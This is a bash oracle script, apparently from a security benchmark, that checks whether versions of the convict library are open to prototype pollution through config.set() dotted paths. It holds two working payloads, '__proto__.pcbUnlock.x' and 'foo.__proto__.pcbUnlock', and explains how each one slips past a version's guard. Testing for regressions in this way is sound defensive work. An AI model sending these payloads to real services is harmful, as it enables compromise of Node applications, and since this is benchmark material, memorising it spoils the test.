#!/usr/bin/env bash
# verify.sh (PCBV2-0043, convict config.set() dotted-path prototype pollution oracle)
#
#   --seed     : path="__proto__.pcbUnlock.x"  (CVE-2022-22143)
#                -> v0 (convict 6.2.1, weak exact-parentKey guard): walk steps onto
#                   Object.prototype => /check returns PCB_FLAG
#                -> v1 (convict 6.2.2, startsWith('__proto__.') prefix guard): BLOCKED
#   --residual : path="foo.__proto__.pcbUnlock"  (CVE-2022-21190 prepended-segment bypass)
#                -> v1 (6.2.2): guard is anchored at key START, dangerous segment later in
#                   path slips through => Object.prototype polluted => /check returns PCB_FLAG
#                -> v2 (6.2.3, includes('.__proto__.') anywhere guard): BLOCKED
#
# Flag channel: GET /check body {"polluted": <PCB_FLAG>} (pollution persists process-wide,
# so the container is restarted before each probe to reset Object.prototype).
# Exit: 0 = flag observed, 10 = not observed, 20 = env failure, 30 = usage error.
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

# 动态端口导出（compose 已转 PORT_ 动态端口；seed_exec 的 BASE 由 PCB_TARGET_PORT 覆盖）
CASE_DIR="${CASE_DIR:-$(cd "$(dirname "$0")/.." && pwd)}"
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-8080}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && export PCB_TARGET_PORT="$_DYN"
export PCB_TARGET_PORT="${PCB_TARGET_PORT:-}"

# Candidate payload for poc/seed_exec.py (expects {"path", "value"}).
if [[ "$MODE" == "--seed" ]]; then
  CAND='{"probe_id":"cve-2022-22143-string-proto-prefix","method":"POST","path_route":"/set","path":"__proto__.pcbUnlock.x","value":"unlocked"}'
else
  CAND='{"probe_id":"cve-2022-21190-prepended-proto","method":"POST","path_route":"/set","path":"foo.__proto__.pcbUnlock","value":"unlocked"}'
fi
printf '%s' "$CAND" > "$WORK_DIR/cand.json"

# Isolation: prototype pollution lives for the process lifetime; restart -> fresh node process.
docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" \
  --profile "$VERSION" restart "$VERSION" >/dev/null 2>&1 || true

export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"  # poc_common importable
OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
echo "$OUT" | head -c 800; echo
"$PY" - "$OUT" <<'PYEOF'
import json, os, sys
try:
    d = json.loads(sys.argv[1])
except Exception as e:
    print("verify: bad seed_exec output:", e); sys.exit(20)
body = str(d.get("check_body") or "")
flag = os.environ.get("RUN_FLAG", "")
print("verify: check_body =", body[:200])
sys.exit(0 if flag in body else 10)
PYEOF
